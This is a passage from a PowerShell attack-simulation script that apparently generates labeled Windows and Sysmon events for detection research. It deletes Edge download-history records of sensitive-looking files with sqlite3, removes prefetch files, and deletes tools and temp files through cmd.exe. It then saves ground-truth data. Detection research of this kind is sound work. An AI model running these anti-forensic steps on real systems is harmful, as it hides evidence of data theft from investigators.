    foreach ($t in @("salary_2025", "budget_plan_q4", "internal.corp")) {
        $dlIds = & $sqlite3 $histDB "SELECT id FROM downloads WHERE target_path LIKE '%$t%';" 2>&1
        if ($dlIds) {
            & $sqlite3 $histDB "DELETE FROM downloads_url_chains WHERE id IN (SELECT id FROM downloads WHERE target_path LIKE '%$t%');" 2>&1 | Out-Null
            & $sqlite3 $histDB "DELETE FROM downloads WHERE target_path LIKE '%$t%';" 2>&1 | Out-Null
            Write-Host "  [INFO] Download records deleted for: $t" -ForegroundColor DarkGreen
        } else {
            Write-Host "  [INFO] No download records found for: $t" -ForegroundColor DarkYellow
        }
    }

    Write-Host "  [INFO] Download record manipulation complete" -ForegroundColor DarkGreen

} $true "EID 4663: sqlite3.exe DELETE FROM downloads/downloads_url_chains (WAL modification)"

Invoke-Stage 12 "prefetch_artifact_cleanup" "file_delete" `
    "C:\Windows\Prefetch\SQLITE3.EXE-*.pf" {

    Write-Host "  [Stage 12] Deleting sqlite3.exe Prefetch artifacts..." -ForegroundColor DarkGray

    # EID 4663 유도: Prefetch 디렉토리 SACL 설정
    Set-DirectorySacl "C:\Windows\Prefetch"

    $pfFiles = Get-ChildItem "C:\Windows\Prefetch" -Filter "SQLITE3.EXE*.pf" `
        -ErrorAction SilentlyContinue

    if ($pfFiles) {
        foreach ($pf in $pfFiles) {
            # EID 4663 유도: 파일 SACL 설정
            Set-HistorySacl $pf.FullName
            try {
                # EID 4688 + Sysmon 26 유도: cmd.exe 경유 삭제
                & cmd.exe /c "del /f /q `"$($pf.FullName)`"" 2>&1 | Out-Null
                Write-Host "  [INFO] Prefetch deleted: $($pf.FullName)" -ForegroundColor DarkGreen
            } catch {
                Write-Host "  [WARN] Could not delete $($pf.FullName) : $_" -ForegroundColor Yellow
            }
        }
    } else {
        Write-Host "  [INFO] No SQLITE3.EXE Prefetch files found" -ForegroundColor DarkYellow
        $fakePf = "C:\Windows\Prefetch\SQLITE3.EXE-DEADBEEF.pf"
        try {
            # EID 11 유도: 파일 생성
            "PF_STUB" | Set-Content $fakePf -Encoding ASCII -Force
            Start-Sleep -Milliseconds 500

            # EID 4663 유도: SACL 설정 후 접근
            Set-HistorySacl $fakePf

            # EID 4688 + Sysmon 26 유도: cmd.exe 경유 삭제
            & cmd.exe /c "del /f /q `"$fakePf`"" 2>&1 | Out-Null
            Write-Host "  [INFO] Stub Prefetch created and deleted (EID 26 triggered)" `
                -ForegroundColor DarkGreen
        } catch {
            Write-Host "  [WARN] Prefetch stub creation failed: $_" -ForegroundColor Yellow
        }
    }

    Write-Host "  [INFO] Prefetch cleanup complete" -ForegroundColor DarkGreen

} $true "Sysmon EID 26 FileDelete + EID 4663,4688: SQLITE3.EXE Prefetch deletion"


Invoke-Stage 13 "tool_and_tmp_cleanup" "file_delete" `
    @($Global:Paths.HistoryExportTmp, $Global:Paths.Sqlite3Exe,
      $Global:Paths.BrowserUpdateZip, $Global:Paths.WinCacheDir) {

    Write-Host "  [Stage 13] Cleaning up tools and temporary files..." -ForegroundColor DarkGray

    $targets = @(
        @{ Path = $Global:Paths.HistoryExportTmp; Desc = "history_export.tmp" }
        @{ Path = $Global:Paths.Sqlite3Exe;        Desc = "sqlite3.exe" }
        @{ Path = $Global:Paths.BrowserUpdateZip;  Desc = "browser_update.zip" }
    )

    foreach ($t in $targets) {
        if (Test-Path $t.Path) {
            & cmd.exe /c "del /f /q `"$($t.Path)`"" 2>&1 | Out-Null
            Write-Host "  [INFO] Deleted via cmd.exe: $($t.Desc)" -ForegroundColor DarkGreen
        } else {
            Write-Host "  [INFO] Not found (already deleted): $($t.Desc)" -ForegroundColor DarkYellow
        }
        Start-Sleep -Milliseconds 300
    }

    if (Test-Path $Global:Paths.WinCacheDir) {
        & cmd.exe /c "rmdir /s /q `"$($Global:Paths.WinCacheDir)`"" 2>&1 | Out-Null
        Write-Host "  [INFO] WinCache directory removed: $($Global:Paths.WinCacheDir)" `
            -ForegroundColor DarkGreen
    } else {
        Write-Host "  [INFO] WinCache already removed" -ForegroundColor DarkYellow
    }

    Write-Host "  [INFO] Tool and tmp cleanup complete" -ForegroundColor DarkGreen

} $true "EID 4663,4688 + Sysmon 1,26: cmd.exe del (history_export.tmp, sqlite3.exe, browser_update.zip, WinCache)"


Invoke-Stage 14 "wal_artifact_remaining" "forensic_check" `
    @($Global:Paths.EdgeHistoryWal, $Global:Paths.EdgeHistoryShm) {

    Write-Host "  [Stage 14] Checking WAL/SHM artifact residuals..." -ForegroundColor DarkGray

    $walPath = $Global:Paths.EdgeHistoryWal
    $shmPath = $Global:Paths.EdgeHistoryShm

    if (Test-Path $walPath) {
        $walSize = (Get-Item $walPath).Length
        Write-Host "  [INFO] History-wal PRESENT ($walSize bytes) - rows may be recoverable" `
            -ForegroundColor Yellow
        $Global:WalPresent = $true
    } else {
        Write-Host "  [INFO] History-wal NOT present (checkpoint completed or not created)" `
            -ForegroundColor DarkGreen
        $Global:WalPresent = $false
    }

    if (Test-Path $shmPath) {
        $shmSize = (Get-Item $shmPath).Length
        Write-Host "  [INFO] History-shm PRESENT ($shmSize bytes)" -ForegroundColor Yellow
    } else {
        Write-Host "  [INFO] History-shm NOT present" -ForegroundColor DarkGreen
    }

    Write-Host "  [INFO] WAL artifact check complete" -ForegroundColor DarkGreen

} $false "(Forensic observation) History-wal/shm residual check"


Invoke-Stage 15 "session_termination" "logoff" `
    $null {

    Write-Host "  [Stage 15] Session termination - EID 4634 will be generated on logoff" `
        -ForegroundColor DarkGray

    $recent4634 = Get-WinEvent -FilterHashtable @{ LogName='Security'; Id=4634 } `
        -MaxEvents 10 -ErrorAction SilentlyContinue |
        Select-Object -First 1

    if ($recent4634) {
        Write-Host "  [INFO] Recent 4634 found: $($recent4634.TimeCreated)" `
            -ForegroundColor DarkGreen
    } else {
        Write-Host "  [INFO] EID 4634 will be generated upon actual session close" `
            -ForegroundColor DarkYellow
    }

    Write-Host "  [INFO] Attack scenario complete. Logs preserved." -ForegroundColor DarkGreen

} $false "EID 4634: Session Logoff (auto-generated on session close)"


# ==============================
# Cleanup
# ==============================
Write-Host ""
Write-Host "[CLEANUP] Starting post-scenario cleanup..." -ForegroundColor Yellow

@($Global:Paths.SalarFile, $Global:Paths.BudgetFile) | ForEach-Object {
    if (Test-Path $_) {
        Remove-Item $_ -Force -ErrorAction SilentlyContinue
        Remove-Item "$_`:Zone.Identifier" -Force -ErrorAction SilentlyContinue
        Write-Host "[CLEANUP] Removed simulated download: $_" -ForegroundColor Green
    }
}

if (Test-Path $Global:Paths.BrowserUpdateZip) {
    Remove-Item $Global:Paths.BrowserUpdateZip -Force -ErrorAction SilentlyContinue
    Write-Host "[CLEANUP] Removed: $($Global:Paths.BrowserUpdateZip)" -ForegroundColor Green
}

if (Test-Path $Global:Paths.WinCacheDir) {
    Remove-Item $Global:Paths.WinCacheDir -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "[CLEANUP] Removed WinCache directory" -ForegroundColor Green
}

Write-Host "[CLEANUP] Complete." -ForegroundColor Green

# ==============================
# Show Summary
# ==============================
Show-Summary

# ==============================
# Save GT
# ==============================
$Global:GT.total_stages    = $Global:GT.records.Count
$Global:GT.wal_present     = if ($Global:WalPresent) { $true } else { $false }
$Global:GT.script_end_time = (Get-Date).ToString("o")

$Global:GT | ConvertTo-Json -Depth 8 | Out-File $GTPath -Encoding UTF8
Write-Host ""
Write-Host "GT saved to $GTPath" -ForegroundColor Yellow